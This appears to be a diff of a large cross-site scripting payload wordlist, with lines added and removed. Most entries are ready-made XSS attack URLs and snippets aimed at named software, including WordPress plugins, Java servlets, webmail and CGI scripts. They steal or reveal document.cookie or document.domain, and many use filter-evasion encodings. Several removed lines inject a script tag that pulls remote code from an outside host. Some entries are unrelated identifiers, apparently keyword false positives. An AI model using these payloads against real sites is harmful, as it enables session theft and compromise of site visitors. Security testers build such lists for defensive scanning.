-plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e&description=test
-plugins/servlet/svnwebclient/statsitem.jsp?url=%3cscript%3ealert(document.domain)%3c%2fscript%3e
-plugins/servlet/wallboard/?dashboardid=10000&dashboardid=10000&cycleperiod=alert(document.domain)
-plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3
 pm.php?function=sendpm&to=victim&subject=subject&images=javascript:alert('vulnerable')&message=message&submitpm=submit
 pm_buddy_list.asp?name=a&desc=b%22%3e<script>alert('vulnerable')</script>%3ca%20s=%22&code=1
 pmf_movable_frame_onmousedown
@@ -22021,7 +21730,6 @@ pms.php?action=send&recipient=destinataire&subject=happy&posticon=javascript:ale
 portmonload=1
 postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>
 precisionfocusing
-printenv.shtml?%3cscript%3ealert(%27xss%27)%3c/script%3e
 profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 prompt(
@@ -22034,15 +21742,11 @@ prototype.join=function(){confirm("pwnd:"+document.body.innerhtml)}')();
 python post_xss.py"><script>"
 q=<script/&q=/src=data:&q=alert(1)>
 qstyleoptionfocusrect
-r2w/signin.do?urll=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 raidmemberframe_onmousedown
 raidmemberframe_onmouseup
 raidpartyframe_onmousedown
 raidpartyframe_onmouseup
-redirect.php/%22%3e%3cscript%3ealert(%22document.domain%22)%3c/script%3e?subject=server&server=test
 regionblurb
-remote/error?errmsg=ababab--%3e%3cscript%3ealert(1337)%3c/script%3e
-remote/loginredir?redir=javascript:alert(document.domain)
 replymsg.php?send=1&destin=<script>alert('vulnerable')</script>
 result => javascript: + /*click me! + #*/alert(1)
 result => javascript: +'click me! + #'-alert(1)
@@ -22060,9 +21764,6 @@ script w/alert()
 script>">'><script>alert(string.fromcharcode(75,67,70))</script>
 script>alert('vulnerable')</script>.cfm
 script\x20type="text/javascript">javascript:alert(1);</script>
-scripts/<script>cross_site_scripting.nasl</script>.pl
-scripts/wa-hap.exe?ticket=test&c=%3cscript%3ealert(document.domain)%3c/script%3e
-scripts/wa.exe?ticket=test&c=%3cscript%3ealert(document.domain)%3c/script%3e
 search.asp?search=\">&lt;script&gt;alert(vulnerable)&lt;/script&gt;
 search.asp?term=<%00script>alert('vulnerable')</script>
 search.php?mailbox=inbox&what=x&where=<script>alert('vulnerable!')</script>&submit=search
@@ -22075,14 +21776,10 @@ search.pl?realm=all&match=0&terms=test&nocpp=1&maxhits=10&;rank=<script>alert('x
 search/?sectionidoverride=1&searchtext=<script>alert(document.cookie);</script>
 search/index.cfm?<script>alert(\"vulnerable\")</script>
 search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
-search?query=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
-secure/configureportalpages!default.jspa?view=search&searchownerusername=%3cscript%3ealert(1)%3c/script%3e&search=search
-security/hostsignon.do?hostsignon=true&servprovcode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9
 select-onblur.xml
 select-onfocus.xml
 select_onblur.xml
 select_onfocus.xml
-services/"%3e%3cscript%3ealert(document.domain)%3c/script%3e/services/
 servlet/contentserver?pagename=<script>alert('vulnerable')</script>
 servlet/cookieexample?cookiename=<script>alert(\"vulnerable\")</script>
 servlet/cookieexample?cookiename=<script>alert(document.cookie)(\
@@ -22093,7 +21790,6 @@ servlet/org.apache.catalina.containerservlet/<script>alert('vulnerable')</script
 servlet/org.apache.catalina.context/<script>alert('vulnerable')</script>
 servlet/org.apache.catalina.globals/<script>alert('vulnerable')</script>
 servlet/org.apache.catalina.servlets.webdavstatus/<script>alert('vulnerable')</script>
-servlet/satellite?destpage=%22%3ch1xxx%3cscriptalert(1)%3c%2fscript&pagename=openmarket%2fxcelerate%2fuiframework%2floginerror
 servlets/msgpage?action=badlogin&msg=<script>alert('vulnerable')</script>
 set system contact <script>alert('vl')</script>
 set system location "><iframe src=a onload=alert("vl") <
@@ -22103,8 +21799,6 @@ settimeout('alert(1)',0)
 settimeout(['alert(/@garethheyes/)']); #chrome #safari #firefox
 settimeout(['confirm(4)']);
 settimeout`alert(1);//${1000}`
-setting.callback.onmousedown.html
-setting.callback.onmouseup.html
 setup.exe?<script>alert('vulnerable')</script>&page=list_users&user=p
 sgdynamo.exe?htname=<script>alert('vulnerable')</script>
 shape_showbuttonfocused.xml
@@ -22115,18 +21809,10 @@ showcat.php?catid=&lt;script&gt;javascript:alert('vulnerable');&lt;/script&gt;
 showcheckins.cgi?person=<script>alert('vulnerable')</script>
 showcheckins.cgi?person=<script>alert('xss')</script>
 showmail.pl?folder=<script>alert(document.cookie)</script>
-sidekiq/queues/"onmouseover="alert(nuclei)"
-siteminderagent/forms/smaceauth.fcc?username=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&smauthreason=7
-siteminderagent/forms/smpwservices.fcc?username=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&smauthreason=7
 siteserver/knowledge/default.asp?ctr=\"><script>alert('vulnerable')</script>
 soinfo.php?\"><script>alert('vulnerable')</script>
-solar_history.php?time_begin=xx%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5c%8e%a6
-solar_slidesub.php?id=4&play=1&pow=sds%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&bgcolor=green
-solutionfocused
-spec/fixtures/pages/onmouseup.html
 sphera/login/sm_login_screen.php?error=\"><script>alert('vulnerable')</script>
 sphera/login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
-src/login.php?referer=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
 src/read_body.php?mailbox=%3cscript%3ealert(vulnerable)%3c%2fscript%3e&passed_id=%3cscript%3ealert(vulnerable)%3c%2fscript%3e&startmessage=1&show_more=0
 src=&#10<img 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 src=javascript:prompt(132)
@@ -22134,14 +21820,11 @@ src=javascript:prompt(19)
 ss000007.pl?prodref=<script>alert('vulnerable')</script>
 ssb_listscrollbar_onmousewheel
 ssb_sorttype_onmousewheel
-ssi/printenv.shtml?%3cscript%3ealert(%27xss%27)%3c/script%3e
 start.cgi/%3cscript%3ealert('vulnerable');%3c/script%3e
 start.cgi/%3cscript%3ealert('xss');%3c/script%3e
-status%3e%3cscript%3ealert(31337)%3c%2fscript%3e
 std_inomotionblurfx.xml
 std_iwa_motionblurcompfx.xml
 std_motionblurfx.xml
-steve/services/"%3e%3cscript%3ealert(document.domain)%3c/script%3e/services/
 stop, open, print && confirm(1)
 store/agora.cgi?cart_id=<script>alert('vulnerable')</script>
 store/agora.cgi?cart_id=<script>alert('xss')</script>
@@ -22185,18 +21868,12 @@ sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>
 sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>
 sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>
 sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>
-telerik.reportviewer.axd?optype=parameters&bgcolor=_000000%22onload=%22prompt(1)
 templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
 test-cgi.exe?<script>alert(document.cookie)</script>
 test.php?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test.shtml?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test=scriptx=document.createelement(%27script%27);x.innerhtml=%27confirm(location)%27;document.body.appendchild(x);/script&notbot=uzxgjmco8aoaafuckteaaaan
 testcgi.exe?<script>alert(document.cookie)</script>
-testfocusonblur.html
-testfocusonblur.java
-tests/kwf/js/clearonfocus/seleniumtest.php
-tests/kwf/js/clearonfocus/testcontroller.php
-tests/zend/http/client/_files/testredirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
 textarea-onblur.xml
 textarea-onfocus.xml
 textarea_onblur.xml
@@ -22213,12 +21890,9 @@ thequesttrackerbar_onmouseup
 this.dangerousurl = 'javascript:alert("hi there")';
 this['eval'.tolowercase()]('alert(1)'.tolowercase())
 throw delete~typeof~confirm(1)/
-tiki-5.2/tiki-edit_wiki_section.php?type=%22%3e%3cscript%3ealert(31337)%3c/script%3e
-tiki-edit_wiki_section.php?type=%22%3e%3cscript%3ealert(31337)%3c/script%3e
 timeflagframescrollbar_onmousewheel
 timing vector <img src=//ixss.sinaapp.com/sleep.php>
 topsitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-tour-list/?keywords=%3cinput%2fautofocus%2f%250d*%2fonfocus%3dalert%28123%29%3b%3e&start_date=xxxxxxxxxxxx&avaibility=13
 trayiconmouseadapter.class
 trayiconmouseadapter.java
 try{confirm(document.domain)}catch(e){location.reload()}
@@ -22231,7 +21905,6 @@ uipanelscrollbuttontemplate_onmousedown
 uipanelscrollframe_onmousewheel
 uipaneltitleframe_onmousedown
 uipaneltitleframe_onmouseup
-unauth/php/change_password.php/%22%3e%3csvg%2fonload%3dalert(1)%3e
 upload.php?type=\"<script>alert(document.cookie)</script>
 url-redirect vuln == xss ! location:data:text/html,<svg/onload=alert(document.domain)> #opera @jackmasa
 usehighresolutionmousewheel
@@ -22240,7 +21913,6 @@ user.php?op=confirmnewuser&module=ns-newuser&uname=%22%3e%3cimg%20src=%22javascr
 user.php?op=userinfo&uname=<script>alert('hi');</script>
 usercp.php?function=avataroptions:javascript:alert(%27vulnerable%27)
 users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-validateonblur.html
 var a = "</script> <script> alert('xss !'); </script> <script>";
 var a = &quot;&lt;/script&gt; &lt;script&gt; alert('xss !'); &lt;/script&gt; &lt;script&gt;&quot;;
 var a=0; ((a == 1) ? 2 : alert(1));//
@@ -22265,17 +21937,12 @@ vbscript:confirm(1);
 vbscript:execute(msgbox(chr(88)&chr(83)&chr(83)))
 vbscript:execute(msgbox(chr(88)&chr(83)&chr(83)))<
 vbscript:prompt(1)#{"action":1}
-vendor/diablomedia/zendframework1-http/tests/zend/http/client/_files/testredirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
 veris-->group<svg/onload=alert(/xss/)//
 viewcvs.cgi/viewcvs/?cvsroot=<script>alert('vulnerable')</script>
 viewcvs.cgi/viewcvs/?cvsroot=<script>alert('xss')</script>
 vq/demos/respond.pl?<script>alert('vulnerable')</script>
 vq/demos/respond.pl?<script>alert('xss')</script>
-wa.exe?ok=<svg/onload=%26%23097lert%26lpar;'mtk')>
 wantonfocus
-web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(document.cookie)</script>
-webapp/?fccc%27\%22%3e%3csvg/onload=alert(/xss/)%3e
-webapp/?fccc0\><script>alert(1)</script>5f43d=1
 webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>
 webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
 webcalendar/week.php?user=\"><script>alert(document.cookie)</script>
@@ -22283,9 +21950,6 @@ webchat/register.php?register=yes&username=overg&email=<script>alert%20(\"vulner
 webkit <iframe> viewsource attribute:  // <iframe viewsource src="//test.de"></iframe> by @0x6d6172696f
 webkit <svg/onload=domain=id> cross-domain and less vector! example: (jsfiddle cross to jsbin) by @jackmasa
 webkit and ff <style/onload=alert(1)>
-webmail/?color=%22%3e%3csvg/onload=alert(document.domain)%3e%22
-webmail/?language=%22%3e%3cimg%20src%3dx%20onerror%3dalert(1)%3e
-webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=u
 webtools/bonsai/cvsblame.cgi?file=<script>alert('vulnerable')</script>
 webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('vulnerable')</script>
 webtools/bonsai/cvslog.cgi?file=<script>alert('vulnerable')</script>
@@ -22304,48 +21968,6 @@ window.open("http://xss.cx","confirm(document.domain);", "", false);
 with(document)alert(cookie)
 with(document)body.appendchild(createelement('iframe onload=&#97&#108&#101&#114&#116(1)>')),body.innerhtml+=''
 with(document.__parent__)alert(1)
-wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3cscript%3ealert(document.domain)%3c/script%3e
-wp-admin/admin-ajax.php?action=bwg_frontend_data&gallery_id=1%22%20onmouseover=alert(1)%3e
-wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//
-wp-admin/admin-ajax.php?action=bwg_frontend_data&tag=%22%20onmouseover=alert(1)%3e
-wp-admin/admin-ajax.php?action=bwg_frontend_data&theme_id=%22%20onmouseover=alert(1)%3e
-wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3cscript%3ealert(document.domain)%3c/script%3e
-wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3cimg%20src=x%20onerror=alert(document.domain)%3e
-wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e]=
-wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>
-wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=<script>alert(document.domain)</script>
-wp-admin/admin-ajax.php?action=swpm_validate_email&fieldid=%22%3cscript%3ealert(document.domain)%3c/script%3e
-wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>
-wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>
-wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>
-wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\u003cscript%3ealert(document.domain)\u003c/script%3e%22}
-wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=<script>alert(document.domain)</script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
-wp-admin/options-general.php?page=cf7sr_edit&"></script><script>alert(document.domain)</script>
-wp-content/plugins/adaptive-images/adaptive-images-script.php/%3cimg/src/onerror=alert(document.domain)%3e/?debug=true
-wp-content/plugins/avchat-3/index_popup.php?movie_param=%3c/script%3e%3cscript%3ealert(document.domain)%3c/script%3e&fb_appid=fb_appid%22%3e%3cscript%3ealert(document.domain)%3c/script%3e&
-wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3e%3cscript%3ealert(1)%3c/script%3e
-wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22
-wp-content/plugins/members-list/admin/view/user.php?page=%22%3e%3cimg%20src%20onerror=alert(document.domain)%20x
-wp-content/plugins/mobilechief-mobile-site-creator/lib/jquery-validate/demo/captcha/index.php/"/><script>alert("qualys_xss");</script>
-wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=not+found&site_name=404
-wp-content/plugins/securimage-wp/siwp_test.php/%22/%3e%3cscript%3ealert(1);%3c/script%3e?tested=1
-wp-content/plugins/si-contact-form/captcha-secureimage/test/index.php/"><script>alert('qg_detected_xss')</script>
-wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3cscript%3ealert(1)%3c%2fscript%3e
-wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3csvg/onload=alert(1)%3e
-wp-content/plugins/wordfence/lib/diffresult.php?file=%27%3e%22%3csvg%2fonload=confirm%28%27test%27%29%3e
-wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>
-wp-content/themes/ambience/thumb.php?src=%3cbody%20onload%3dalert(1)%3e.jpg
-wp-login.php?login-error=<script>alert(document.domain)</script>
-wpdmpro/list-packages/?orderby=title%22%3e%3cscript%3ealert(1)%3c/script%3e&order=asc
-www/delivery/afr.php?refresh=10000&")',10000000);alert(1337);settimeout('alert("
-www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);settimeout(alert(\
-wwwiraqoccupationfocusorguk
 wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>
 x<form id=test onforminput=javascript:alert(1)><input></form>
 x<form id=test><input></form><button form=test onformchange==javascript:alert(1)>x
